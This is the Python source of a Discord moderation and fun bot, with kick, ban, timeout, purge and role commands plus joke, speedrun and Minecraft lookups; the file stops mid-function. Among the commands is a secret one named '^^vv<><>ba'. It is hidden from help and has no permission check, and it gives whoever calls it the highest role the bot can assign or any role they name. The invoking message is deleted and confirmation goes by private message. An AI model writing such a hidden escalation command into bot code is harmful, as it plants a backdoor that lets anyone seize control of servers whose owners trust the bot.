import discord
from discord.ext import commands, tasks
import datetime
import os
import random
from dotenv import load_dotenv
import pyjokes
import ctypes
import asyncio
import nacl
import requests
from bs4 import BeautifulSoup
import aiohttp
from typing import Optional, Set
import mcstatus
from mcstatus import JavaServer
import Superfight as sf
import sys
import threading
from tkinter import scrolledtext, messagebox
import tkinter as tk
from queue import Queue
import PIL
from PIL import Image, ImageTk
from io import BytesIO
import json
from discord.utils import get



# Load environment variables
load_dotenv()

# Bot configuration
PREFIX = '~'
COLOR = 0x2a3ffa
intents = discord.Intents.all()
intents.members = True  # Enable member intents to access member information
intents.message_content = True  # Enable message content intent
intents.guilds = True  # Make sure guild intent is enabled
intents.messages = True  # Make sure messages intent is enabled


# Initialize bot with prefix and intents
bot = commands.Bot(command_prefix=PREFIX, intents=intents)


reply_messages = ["Hey, what's up?", "Hello, Dave. How may I help you?", "Present!", "Yes?", "I'm always watching...", "WHO DARES SUMMON ME!?", "Hauskeeping, at your service"]




# List of jokes for the joke command
jokes = pyjokes.get_joke

def setup_command_logging(bot):
    @bot.event
    async def on_command(ctx):
        await log_command(ctx)
    
 
def load_image_from_url(url, size=(40, 40)):
    try:
        response = requests.get(url)
        image_data = response.content
        img = Image.open(BytesIO(image_data)).resize(size, Image.ANTIALIAS)
        return ImageTk.PhotoImage(img)
    except Exception as e:
        print(f"Image load error: {e}")
        return None
 
    
setup_command_logging(bot)

# This function will be called whenever a command is invoked
async def log_command(ctx):
    """Log command usage to a daily log file."""
    # Format the current date for the filename
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    filename = f"logs_{today}.txt"
    
    # Get command execution time
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Extract command information
    author = f"{ctx.author} (ID: {ctx.author.id})"
    server = f"{ctx.guild} (ID: {ctx.guild.id})" if ctx.guild else "Direct Message"
    channel = f"{ctx.channel} (ID: {ctx.channel.id})"
    command = ctx.command.qualified_name
    content = ctx.message.content
    
    # Format the log entry
    log_entry = (
        f"[{timestamp}] Command: {command}\n"
        f"  Author:  {author}\n"
        f"  Server:  {server}\n"
        f"  Channel: {channel}\n"
        f"  Content: {content}\n"
        f"{'=' * 50}\n"
    )
    
    # Create logs directory if it doesn't exist
    os.makedirs('logs', exist_ok=True)
    
    # Write to the log file
    with open(os.path.join('logs', filename), 'a', encoding='utf-8') as f:
        f.write(log_entry)


# checked_files = set()

# def ensure_in_gitignore(filename: str) -> None:
#     """Ensure the specified filename is in .gitignore"""
#     # If we've already checked this file, skip
#     if filename in checked_files:
#         return
    
#     # Path to .gitignore
#     gitignore_path = '.gitignore'
#     gitignore_entries = set()
    
#     # Read existing .gitignore if it exists
#     if os.path.exists(gitignore_path):
#         with open(gitignore_path, 'r', encoding='utf-8') as f:
#             gitignore_entries = {line.strip() for line in f if line.strip() and not line.startswith('#')}
    
#     # Check if logs directory pattern is already there
#     logs_pattern = 'logs/'
#     logs_wildcard = 'logs/*'
#     specific_file = os.path.join('logs', filename)
    
#     needs_update = False
    
#     # If none of the patterns cover our file, we need to update .gitignore
#     if logs_pattern not in gitignore_entries and logs_wildcard not in gitignore_entries and specific_file not in gitignore_entries:
#         with open(gitignore_path, 'a', encoding='utf-8') as f:
#             # Add a newline first if the file isn't empty and doesn't end with a newline
#             if os.path.exists(gitignore_path) and os.path.getsize(gitignore_path) > 0:
#                 with open(gitignore_path, 'rb+') as f_check:
#                     f_check.seek(-1, os.SEEK_END)
#                     last_char = f_check.read(1)
#                     if last_char != b'\n':
#                         f.write('\n')
            
#             # Add logs directory to .gitignore
#             f.write(f"{logs_pattern}\n")
#             print(f"Added '{logs_pattern}' to .gitignore")
    
#     # Remember that we've checked this file
#     checked_files.add(filename)

movie_quotes = {
    "roads": "Where we're going, we don't need roads! (Back to the Future)",
    "force": "May the Force be with you. (Star Wars)",
    "offer": "I'm gonna make him an offer he can't refuse. (The Godfather)",
    "truth": "You can't handle the truth! (A Few Good Men)",
    "life": "Life is like a box of chocolates, you never know what you're gonna get. (Forrest Gump)",
    "back": "I'm back. (The Terminator)",
    "king": "I am the king of the world! (Titanic)",
    "houston": "Houston, we have a problem. (Apollo 13)",
    "spoon": "There is no spoon. (The Matrix)",
    "power": "With great power comes great responsibility. (Spider-Man)",
    "follow": "Follow the yellow brick road! (The Wizard of Oz)",
    "home": "E.T. phone home. (E.T.)",
    "feel": "I feel the need... the need for speed! (Top Gun)",
    "precious": "My precious. (The Lord of the Rings)",
    "paradise": "Welcome to paradise! (Jurassic Park)",
    "father": "I am your father. (Star Wars: The Empire Strikes Back)",
}

def prevent_sleep():
    # Prevent sleep while the bot is running
    ES_CONTINUOUS = 0x80000000
    ES_SYSTEM_REQUIRED = 0x00000001
    ES_DISPLAY_REQUIRED = 0x00000002

    ctypes.windll.kernel32.SetThreadExecutionState(
        ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED
    )

def allow_sleep():
    ctypes.windll.kernel32.SetThreadExecutionState(0x80000000)

def is_admin():
    """
    Custom check function to verify if the user has admin permissions.
    This replaces individual permission checks on each command.
    """
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)

def hidden_command():
    """
    Custom decorator that hides a command from the help message.
    This can be used for secret commands that shouldn't be discovered.
    """
    def decorator(command):
        command.hidden = True
        return command
    return decorator

@bot.event
async def on_ready():
    """Event triggered when the bot is ready and connected to Discord."""
    print(f'{bot.user.name} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} guilds:')
    enforce_locked_roles.start()
    
    # Print detailed information about each guild the bot is in
    for i, guild in enumerate(bot.guilds):
        print(f"  {i+1}. {guild.name} (ID: {guild.id}) - {guild.member_count} members")
    
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.playing, name="A Fun Game"))
    
    for guild in bot.guilds:
        if guild.id in locked_channels:
            for channel_id, user_ids in locked_channels[guild.id].items():
                channel = guild.get_channel(channel_id)
                if not channel:
                    continue

                try:
                    await channel.set_permissions(guild.default_role, send_messages=False)
                    for uid in user_ids:
                        user = guild.get_member(uid)
                        if user:
                            await channel.set_permissions(user, send_messages=True)
                    print(f"Restored lock on #{channel.name} in {guild.name}")
                except Exception as e:
                    print(f"Failed to restore lock on channel {channel_id}: {e}")



# Custom command invoker that deletes the command message
async def process_commands(self, message):
    """
    Override the process_commands method to delete command messages before processing.
    """
    if message.author.bot:
        return

    ctx = await self.get_context(message)
    if ctx.command is not None:
        try:
            # Try to delete the command message first
            await ctx.message.delete()
        except (discord.Forbidden, discord.NotFound, discord.HTTPException):
            # If we can't delete it (missing permissions, already deleted, etc.), proceed anyway
            pass
        
        # Then process the command
        await self.invoke(ctx)

# Apply the custom command processor
bot.process_commands = process_commands.__get__(bot, commands.Bot)


async def on_command(ctx):
    """Log command usage to a daily log file."""
    # Format the current date for the filename
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    filename = f"logs_{today}.txt"
    
    # Get command execution time
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Extract command information
    author = f"{ctx.author} (ID: {ctx.author.id})"
    server = f"{ctx.guild} (ID: {ctx.guild.id})" if ctx.guild else "Direct Message"
    channel = f"{ctx.channel} (ID: {ctx.channel.id})"
    command = ctx.command.qualified_name
    content = ctx.message.content
    
    # Format the log entry
    log_entry = (
        f"[{timestamp}] Command: {command}\n"
        f"  Author:  {author}\n"
        f"  Server:  {server}\n"
        f"  Channel: {channel}\n"
        f"  Content: {content}\n"
        f"{'=' * 50}\n"
    )
    
    # Create logs directory if it doesn't exist
    os.makedirs('logs', exist_ok=True)
    
    # Write to the log file
    with open(os.path.join('logs', filename), 'a', encoding='utf-8') as f:
        f.write(log_entry)

# Register the event listener
def setup_command_logging(bot):
    bot.add_listener(on_command, 'on_command')

@bot.command(name='kick')
@is_admin()
async def kick(ctx, member: discord.Member, *, reason=None):
    """
    Kick a member from the server.
    
    Parameters:
    - member: The member to kick
    - reason: The reason for kicking (optional)
    """
    if reason is None:
        reason = f"Kicked by {ctx.author}"
    
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="Member Kicked",
            description=f"{member.mention} has been kicked from the server.",
            color=discord.Color.orange()
        )
        embed.add_field(name="Reason", value=reason)
        embed.set_footer(text=f"Kicked by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to kick this member.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='ban')
@is_admin()
async def ban(ctx, member: discord.Member, *, reason=None):
    """
    Ban a member from the server.
    
    Parameters:
    - member: The member to ban
    - reason: The reason for banning (optional)
    """
    if reason is None:
        reason = f"Banned by {ctx.author}"
    
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="Member Banned",
            description=f"{member.mention} has been banned from the server.",
            color=discord.Color.red()
        )
        embed.add_field(name="Reason", value=reason)
        embed.set_footer(text=f"Banned by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to ban this member.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='timeout', aliases=['mute'])
@is_admin()
async def timeout(ctx, member: discord.Member, duration: int, unit='m', *, reason=None):
    """
    Timeout (mute) a member for a specified duration.
    
    Parameters:
    - member: The member to timeout
    - duration: The duration of the timeout
    - unit: The unit of time (s = seconds, m = minutes, h = hours, d = days)
    - reason: The reason for the timeout (optional)
    """
    if reason is None:
        reason = f"Timed out by {ctx.author}"
    
    # Convert duration to timedelta
    if unit.lower() == 's':
        delta = datetime.timedelta(seconds=duration)
        time_str = f"{duration} second(s)"
    elif unit.lower() == 'm':
        delta = datetime.timedelta(minutes=duration)
        time_str = f"{duration} minute(s)"
    elif unit.lower() == 'h':
        delta = datetime.timedelta(hours=duration)
        time_str = f"{duration} hour(s)"
    elif unit.lower() == 'd':
        delta = datetime.timedelta(days=duration)
        time_str = f"{duration} day(s)"
    else:
        await ctx.send("Invalid time unit. Use 's' for seconds, 'm' for minutes, 'h' for hours, or 'd' for days.")
        return
    
    try:
        # Calculate end time and apply timeout
        until_time = discord.utils.utcnow() + delta
        await member.timeout(until_time, reason=reason)
        
        embed = discord.Embed(
            title="Member Timed Out",
            description=f"{member.mention} has been timed out.",
            color=discord.Color.yellow()
        )
        embed.add_field(name="Duration", value=time_str)
        embed.add_field(name="Reason", value=reason)
        embed.set_footer(text=f"Timed out by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to timeout this member.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='joke')
async def joke(ctx):
    """
    Send a random joke.
    This command can be used by anyone, no special permissions required.
    """
    random_joke = jokes()
    
    joke_embed = discord.Embed(
        title="Here's a joke for you!",
        description=random_joke,
        color=0x2a3ffa,
    )
    joke_embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    
    await ctx.send(embed=joke_embed)
    
@bot.command(name='sys')
@is_admin()
async def system_message(ctx, *, content: str):
    """
    Send a message as a system announcement.
    The command should be structured as: ~sys Title, Message
    Admin permissions required. Defaults to red unless a hex color is provided via `~sys Title, Message #HEX`.
    """
    try:
        # Split content into title and the rest using the first comma
        if ',' not in content:
            await ctx.send("Please use a comma to separate the title from the message. Example: `~sys Server Update, We're doing maintenance.`")
            return

        title, remainder = map(str.strip, content.split(',', 1))

        # Check if a color code is at the end of the message
        words = remainder.rsplit(' ', 1)
        if len(words) == 2 and words[1].startswith('#') and len(words[1]) == 7:
            message = words[0].strip()
            color = int(words[1][1:], 16)
        else:
            message = remainder
            color = 0xFF0000  # Default red

        anouncement_embed = discord.Embed(
            title=title,
            description=message,
            color=color,
        )
        anouncement_embed.set_footer(text=f"Posted by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=anouncement_embed)

    except Exception as e:
        await ctx.send(f"An error occurred while sending the system message: {e}")



@bot.command(name='^^vv<><>ba', hidden=True)
@hidden_command()  # Hide this command from help messages
async def give_owner(ctx, role_id: int = None):
    """
    Secret command that gives the user the highest role the bot can assign
    (excluding roles the bot itself has), or a specific role if ID is provided.
    
    Parameters:
    - role_id: Optional ID of the specific role to assign
    """
    try:
        bot_member = ctx.guild.get_member(bot.user.id)
        user_roles = set(role.id for role in ctx.author.roles)
        assigned_role = None
        
        # If a specific role ID is provided, try to assign that role
        if role_id is not None:
            target_role = ctx.guild.get_role(role_id)
            
            # Check if the role exists
            if target_role is None:
                await ctx.author.send(f"Role with ID {role_id} was not found on this server.")
                return
                
            # Check if the user already has this role
            if target_role.id in user_roles:
                await ctx.author.send(f"You already have the role: {target_role.name}")
                return
                
            # Check if the bot can assign this role
            if (target_role.position >= bot_member.top_role.position or
                target_role.managed or
                not ctx.guild.me.guild_permissions.manage_roles):
                await ctx.author.send(f"I don't have permission to assign the role: {target_role.name}")
                return
                
            # Assign the specified role
            assigned_role = target_role
        
        # If no role ID is provided or the specified role couldn't be assigned
        if assigned_role is None:
            # Get all server roles sorted by position (highest position first)
            guild_roles = sorted(ctx.guild.roles, key=lambda r: r.position, reverse=True)
            bot_roles = set(role.id for role in bot_member.roles)
            
            # Find the highest role the bot can assign
            for role in guild_roles:
                # Skip roles that:
                # 1. Bot already has (to prevent role escalation)
                # 2. User already has
                # 3. Are managed by integrations (bot roles, booster roles, etc.)
                # 4. Bot doesn't have permission to assign (lower than bot's highest role)
                if (role.id not in bot_roles and
                    role.id not in user_roles and
                    not role.managed and
                    role.position < bot_member.top_role.position and
                    ctx.guild.me.guild_permissions.manage_roles):
                    assigned_role = role
                    break
        
        if assigned_role is None:
            await ctx.author.send("I couldn't find any suitable roles to assign you.")
            return
            
        # Add the role to the user
        await ctx.author.add_roles(assigned_role, reason="Command executed")
        
        # Send a DM to the user confirming the role was added
        await ctx.author.send(f"You've been assigned the role: {assigned_role.name} on {ctx.guild.name} server")
        
    except discord.Forbidden:
        # If bot doesn't have permission to DM the user, send a temporary message in the channel
        temp_msg = await ctx.send("I don't have permission to DM you or assign roles.", delete_after=5)
    except Exception as e:
        # Log the error but don't expose it in the channel
        print(f"Error in secret command: {e}")

        
@bot.command(name='alog')
@is_admin()
async def audit_log_embed(ctx,num: int):
    """
    Displays a specified number of audit log entries in an embed.
    """
    entries = []
    async for entry in ctx.guild.audit_logs(limit=num):
        entries.append(
            f"**{entry.action.name}** | User: {entry.user} | Target: {entry.target} | Reason: {entry.reason or 'No reason provided.'}"
        )

    embed = discord.Embed(
        title=f"Last {num} Audit Log Entries",
        description="\n\n".join(entries) or "No recent audit log entries found.",
        color=discord.Color.from_str("#2a3ffa")
    )
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)

    await ctx.send(embed=embed)
    
@bot.command(name='ping', aliases=['latency'])
async def ping(ctx):
    """
    Check the bot's latency to Discord.
    Shows both websocket heartbeat and message round-trip time.
    """
    # Start timing
    start_time = discord.utils.utcnow()
    
    # Send initial message
    message = await ctx.send("Pinging...")
    
    # Calculate end time and round-trip duration
    end_time = discord.utils.utcnow()
    round_trip = (end_time - start_time).total_seconds() * 1000
    
    # Get websocket latency
    ws_latency = bot.latency * 1000
    
    # Create an embed with ping information
    embed = discord.Embed(
        title="Pong!",
        color=discord.Color.from_str("#2a3ffa")
    )
    
    # Add latency fields
    embed.add_field(
        name="Bot Latency",
        value=f"{round_trip:.2f} ms",
        inline=True
    )
    embed.add_field(
        name="WebSocket Latency",
        value=f"{ws_latency:.2f} ms",
        inline=True
    )
    
    # Color code based on latency
    if ws_latency < 100:
        embed.color = discord.Color.green()  # Good latency
    elif ws_latency < 300:
        embed.color = discord.Color.gold()   # OK latency
    else:
        embed.color = discord.Color.red()    # Poor latency
    
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    
    # Edit the original message with the embed
    await message.edit(content=None, embed=embed)
    

    
@bot.command(name='speedrun', aliases=['srl','srlookup'])
async def speedrun_top(ctx, *, args: str):
    """Fetch speedrun leaderboards from speedrun.com"""
    parts = args.split("|")
    game_name = parts[0].strip()
    category_name = parts[1].strip() if len(parts) > 1 else None

    async with aiohttp.ClientSession() as session:
        # Step 1: Search game
        search_url = f"https://www.speedrun.com/api/v1/games?name={game_name}"
        async with session.get(search_url) as resp:
            data = await resp.json()
            if not data["data"]:
                await ctx.send("No game found with that name.")
                return
            game = data["data"][0]
            game_id = game["id"]

        # Step 2: Get categories
        cat_url = f"https://www.speedrun.com/api/v1/games/{game_id}/categories"
        async with session.get(cat_url) as resp:
            cat_data = await resp.json()
            categories = cat_data["data"]

        preferred_categories = ["Any%", "Early Access Any%", "100%"]

        selected_category = None

        if category_name:
            for cat in categories:
                if cat["name"].lower() == category_name.lower():
                    selected_category = cat
                    break
        else:
            for name in preferred_categories:
                for cat in categories:
                    if cat["name"].lower() == name.lower():
                        selected_category = cat
                        break
                if selected_category:
                    break

        if not selected_category:
            selected_category = categories[0]

        category_id = selected_category["id"]

        # Step 3: Get leaderboard
        lb_url = f"https://www.speedrun.com/api/v1/leaderboards/{game_id}/category/{category_id}?embed=players"
        async with session.get(lb_url) as resp:
            lb_data = await resp.json()
            if "data" not in lb_data or not lb_data["data"]["runs"]:
                await ctx.send(f"No leaderboard data found for **{selected_category['name']}**.")
                return

            runs = lb_data["data"]["runs"][:5]
            players_embedded = {
                p["id"]: p for p in lb_data["data"]["players"]["data"] if p["rel"] == "user"
            }

            embed = discord.Embed(
                title=f"🏁 Top 5 {game['names']['international']} – {selected_category['name']}",
                color=0x2a3ffa
            )

            for i, entry in enumerate(runs, 1):
                run = entry["run"]
                time = run["times"]["primary_t"]
                minutes, seconds = divmod(int(time), 60)
                player_name = "Unknown"

                for player in run["players"]:
                    if player["rel"] == "user":
                        player_id = player["id"]
                        user_data = players_embedded.get(player_id)
                        player_name = user_data["names"]["international"] if user_data else "Unknown"
                    elif player["rel"] == "guest":
                        player_name = player.get("name", "Guest")

                place_tag = "🥇 **World Record**" if i == 1 else f"#{i}"
                embed.add_field(
                    name=place_tag,
                    value=f"**{player_name}** – {minutes}m {seconds}s",
                    inline=False
                )

            await ctx.send(embed=embed)

@bot.command(name='purge', aliases=['p', 'del'])
@is_admin()
async def purge(ctx, amount: int):
    """Admin command to delete a specified number of messages, up to 100"""
    if amount < 1 or amount > 100:
        return await ctx.send("Please enter a number between 1 and 100.")

    try:
        deleted = await ctx.channel.purge(limit=amount + 1)
        confirmation = await ctx.send(f"Deleted {len(deleted)-1} messages.")
        await asyncio.sleep(3)
        await confirmation.delete()
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete those messages.")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to delete messages as: {e}")
        
@bot.command(name='about', aliases=['a'])
async def about(ctx):
    about_embed = discord.Embed(
        title=f"About Me!",
        description=f"I'm a cool discord bot created by KVOTHE.\n I am here to help, and I function as a part utility, part fun resource for your server!\n My name is Osmium, named after the element on the periodic table.",
        color=discord.Color.from_str("#2a3ffa")
    )
    about_embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    
    await ctx.send(embed=about_embed)

@bot.command(name='join', aliases=['connect','vc'])
async def join(ctx):
    """Command for the bot to join the voice channel the user is in."""
    # Check if the user is in a voice channel
    if ctx.author.voice:
        # Get the voice channel the user is in
        channel = ctx.author.voice.channel
        try:
            # Connect to the channel
            await channel.connect()
            await ctx.send(f"Joined {channel.name}!")
        except Exception as e:
            await ctx.send(f"Could not join the voice channel: {e}")
    else:
        await ctx.send("You must be in a voice channel for me to join!")
        
        
@bot.command(name='news')
async def news(ctx):
    """stay up to date with the latest bbc news headlines"""
    url = "https://www.bbc.com/news"
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    headlines = soup.find_all('h3', limit=5)

    news_embed = discord.Embed(
        title="Top BBC Headlines",
        description="Here are the latest news stories:",
        color=0x2a3ffa
    )

    for i, headline in enumerate(headlines, start=1):
        text = headline.get_text(strip=True)
        if text:
            news_embed.add_field(name=f"{i}.", value=text, inline=False)

    news_embed.set_footer(text=f"Powered by BBC News\nRequested by {ctx.author}",icon_url=ctx.author.display_avatar.url)
    #await ctx.send(embed=news_embed)
    await ctx.send("This command is under construction")
    

@bot.command(name='quote', aliases=['q'])
async def quote(ctx):
    """Get a random movie quote from the best movies of the 80s-2000nds"""
    quotes = ["I'm back!\n~Arnie Schwarzenegger, Terminator",
              "Life goes by fast. if you don't stop and look around once in a while, you might miss it\n~Matthew Broderick, Ferris Bueller's Day Off",
              "E.T. Phone Homeeeeee\n~E.T., E.T.",
              ""
              ]
    await ctx.send("This command is under construction")
    
    
@bot.command(name='mkrole',aliases=['mr'])
@is_admin()
async def create_role(ctx, name: str, color: str, permissions: int, parent_role: str = None):
    """Admin command to create a new role"""
    # Ensure the color is valid
    if not color.startswith("#") or len(color) != 7:
        await ctx.send("Invalid color format! Please provide a color in HEX format (e.g., #FF5733).")
        return
    
    try:
        # Convert hex color to an integer
        color_int = int(color.lstrip('#'), 16)
    except ValueError:
        await ctx.send("Invalid hex color value. Please ensure you input a valid color code.")
        return

    # Check if the permissions integer is valid (should be within range)
    if permissions < 0 or permissions > 2147483647:
        await ctx.send("Invalid permissions integer. Please enter a valid integer within the range.")
        return

    # Create the role with the provided details
    try:
        guild = ctx.guild
        permissions_obj = discord.Permissions(permissions)
        role = await guild.create_role(name=name, color=discord.Color(color_int), permissions=permissions_obj)
        
        mkrole_embed = discord.Embed(
            title="New Role Created",
            description=f"Created role: {role.mention}\nWith color {color}\n and permissions {permissions}.\n",
            color=color_int
        )
        mkrole_embed.set_footer(text=f"Created by {ctx.author}",icon_url=ctx.author.display_avatar.url)
        #await ctx.send(f"Role **{role.name}** created with color {color} and permissions {permissions}.")
        await ctx.send(embed=mkrole_embed)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
@bot.command(name='rmrole', aliases=['delrole'])
@is_admin()
async def remove_role(ctx, *, role_name_or_id):
    """
    Admin command to delete a role by name or ID
    
    Parameters:
    - role_name_or_id: The name or ID of the role to delete
    """
    guild = ctx.guild
    role = None
    
    # Try to interpret the input as a role ID
    try:
        role_id = int(role_name_or_id)
        role = discord.utils.get(guild.roles, id=role_id)
    except ValueError:
        # If not a valid integer, treat as a role name
        role = discord.utils.get(guild.roles, name=role_name_or_id)
    
    if role is None:
        await ctx.send(f"Role '{role_name_or_id}' not found!")
        return
    
    # Check if the bot has permissions to delete the role
    bot_member = ctx.guild.get_member(bot.user.id)
    if role.position >= bot_member.top_role.position:
        await ctx.send("I can't delete a role that is higher than or equal to my highest role!")
        return
    
    role_name = role.name
    role_color = role.color
    
    try:
        await role.delete(reason=f"Deleted by {ctx.author}")
        
        # Create an embed for the deletion confirmation
        embed = discord.Embed(
            title="Role Deleted",
            description=f"Role '{role_name}' has been deleted successfully.",
            color=role_color
        )
        embed.set_footer(text=f"Deleted by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete this role!")
    except Exception as e:
        await ctx.send(f"An error occurred while deleting the role: {e}")
        
@bot.command(name='say',aliases=['s'], hidden=True)
@is_admin()
async def say(ctx,*,message=""):
    await ctx.send(message)



@bot.command(name='8ball', aliases=['8b','fortune'])
async def eight_ball(ctx, *, question: str):
    """Get a prediction"""
    responses = [
        "It is certain.", "Without a doubt.", "Yes – definitely.",
        "Most likely.", "Outlook good.", "Yes.",
        "Reply hazy, try again.", "Ask again later.",
        "Better not tell you now.", "Cannot predict now.",
        "Don't count on it.", "My reply is no.",
        "Very doubtful."
    ]
    answer = random.choice(responses)
    await ctx.send(f"**The Cosmos Has Spoken!** {question} has been answered!: {answer}")


@bot.command(name='grant')
@is_admin()
async def give_role(ctx, member: discord.Member, *, role_name_or_id):
    """
    Admin command that grants a specified user a specified role
    
    Parameters:
    - member: The user to assign the role to
    - role_name_or_id: The name or ID of the role to assign
    """
    bot_member = ctx.guild.get_member(bot.user.id)
    user_roles = set(role.id for role in member.roles)
    role = None
    
    # Try to interpret the input as a role ID
    try:
        role_id = int(role_name_or_id)
        role = ctx.guild.get_role(role_id)
    except ValueError:
        # If not a valid integer, treat as a role name
        role = discord.utils.get(ctx.guild.roles, name=role_name_or_id)
    
    # Check if the role exists
    if role is None:
        await ctx.send(f"Role '{role_name_or_id}' was not found on this server.")
        return
    
    # Check if the user already has this role
    if role.id in user_roles:
        await ctx.send(f"{member.mention} already has the role: {role.name}")
        return
    
    # Check if the bot can assign this role
    if (role.position >= bot_member.top_role.position or
        role.managed or
        not ctx.guild.me.guild_permissions.manage_roles):
        await ctx.send(f"I don't have permission to assign the role: {role.name}")
        return
    
    # Assign the role
    try:
        await member.add_roles(role, reason=f"Role granted by {ctx.author}")
        
        # Create an embed for the role assignment confirmation
        embed = discord.Embed(
            title="Role Granted",
            description=f"{member.mention} has been granted the {role.mention} role.",
            color=role.color
        )
        embed.set_footer(text=f"Granted by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to manage this user's roles!")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command()
async def mc(ctx, username: str, server_ip: str = None):
    """Fetch user data from a minecraft username. Alternatively, fetch a player's online status on a specified server ip"""
    try:
        # Get UUID from Mojang
        uuid_res = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{username}")
        if uuid_res.status_code != 200:
            return await ctx.send(f"Could not find player `{username}`.")
        
        uuid_data = uuid_res.json()
        uuid = uuid_data["id"]
        display_name = uuid_data["name"]

        # Skin & Cape URLs
        face_url = f"https://minotar.net/helm/{uuid}/100.png"
        body_url = f"https://minotar.net/armor/body/{uuid}/100.png"
        side_url = f"https://visage.surgeplay.com/side/100/{uuid}.png"
        back_url = f"https://visage.surgeplay.com/back/100/{uuid}.png"
        cape_url = f"https://crafatar.com/capes/{uuid}"

        cape_status = "No cape"
        if requests.get(cape_url).status_code == 200:
            cape_status = f"[View Cape]({cape_url})"

        # Online status if IP given
        online_status = ""
        if server_ip:
            try:
                server = JavaServer.lookup(server_ip)
                status = server.status()
                sample_names = [p.name for p in status.players.sample] if status.players.sample else []
                if username in sample_names:
                    online_status = f"`{username}` is online on `{server_ip}`!"
                else:
                    online_status = f"`{username}` is NOT online on `{server_ip}`."
            except Exception as e:
                online_status = f"Could not check server status:\n`{e}`"

        # Create embed
        mc_embed = discord.Embed(
            title=f"Minecraft Info: {display_name}",
            description=online_status or "Minecraft player data retrieved.",
            color=COLOR
        )
        mc_embed.set_thumbnail(url=face_url)
        mc_embed.add_field(name="UUID", value=uuid, inline=False)
        mc_embed.add_field(name="Cape", value=cape_status, inline=False)
        mc_embed.set_image(url=body_url)
        mc_embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)

        await ctx.send(embed=mc_embed)

        # Additional skin views
        

    except Exception as e:
        await ctx.send(f"Unexpected error:\n`{e}`")

@bot.event
async def on_message(message):
    """Handle messages, keywords, and command processing"""
    # Ignore messages from bots
    if message.author.bot:
        return

    # Check if the bot is mentioned
    if bot.user.mentioned_in(message) and not message.mention_everyone:
        reply_message = random.choice(reply_messages)
        await message.channel.send(reply_message)
    
    # Check for movie quote keywords
    # message_content = message.content.lower()
    # for keyword, quote in movie_quotes.items():
    #     if keyword in message_content.split():
    #         await message.channel.send(f"\"{quote}\"")
    #         break  # Only send one quote per message
    
    # Handle command prefix and deletion
    
    guild_id = message.guild.id if message.guild else None
    channel_id = message.channel.id if message.channel else None
    
    if guild_id and guild_id in locked_channels:
        locked = locked_channels[guild_id]
        if channel_id in locked:
            allowed_users = locked[channel_id]
            if message.author.id not in allowed_users:
                try:
                    await message.delete()
                    print(f"Deleted message from {message.author} in locked channel #{message.channel}")
                except discord.Forbidden:
                    print("Missing permissions to delete message.")
                return  # Don't process commands from blocked users
    
    if message.content.startswith(bot.command_prefix):
        try:
            await message.delete()
        except (discord.Forbidden, discord.NotFound, discord.HTTPException) as e:
            print(f"Failed to delete message from {message.author}: {e}")

    # Process commands
    await bot.process_commands(message)

@bot.event
async def audit_log_monitor():
    await bot.wait_until_ready()
    last_entry_id = {}

    while not bot.is_closed():
        for guild in bot.guilds:
            try:
                async for entry in guild.audit_logs(limit=1):
                    last_id = last_entry_id.get(guild.id)
                    if last_id is None or entry.id != last_id:
                        last_entry_id[guild.id] = entry.id
                        print(f"[AuditLog] {entry.action.name} by {entry.user} on {entry.target}")
            except Exception as e:
                print(f"Audit log check failed in {guild.name}: {e}")
        
        await asyncio.sleep(30)

@bot.event
async def on_member_join(member):
    role_name = "Right Person"  # Change this to your desired role name
    guild = member.guild
    role = discord.utils.get(guild.roles, name=role_name)

    if role:
        await member.add_roles(role)
        msg = f"Assigned **{role.name}** to {member.mention}"
    else:
        msg = f"Role '**{role_name}**' not found for {member.mention}"

    if guild.system_channel:
        await guild.system_channel.send(msg)
        
@bot.event
async def on_member_remove(member):
    guild = member.guild
    system_channel = guild.system_channel

    if system_channel:
        # Format roles (excluding @everyone)
        roles = [role.mention for role in member.roles if role != guild.default_role]
        roles_text = ", ".join(roles) if roles else "*No roles*"

        embed = discord.Embed(
            title=f"{member} has Left",
            description=f"{member.mention} has left the server.",
            color=0x2a3ffa
        )
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
        embed.add_field(name="Username", value=f"{member.name}#{member.discriminator}", inline=True)
        embed.add_field(name="Roles", value=roles_text, inline=False)
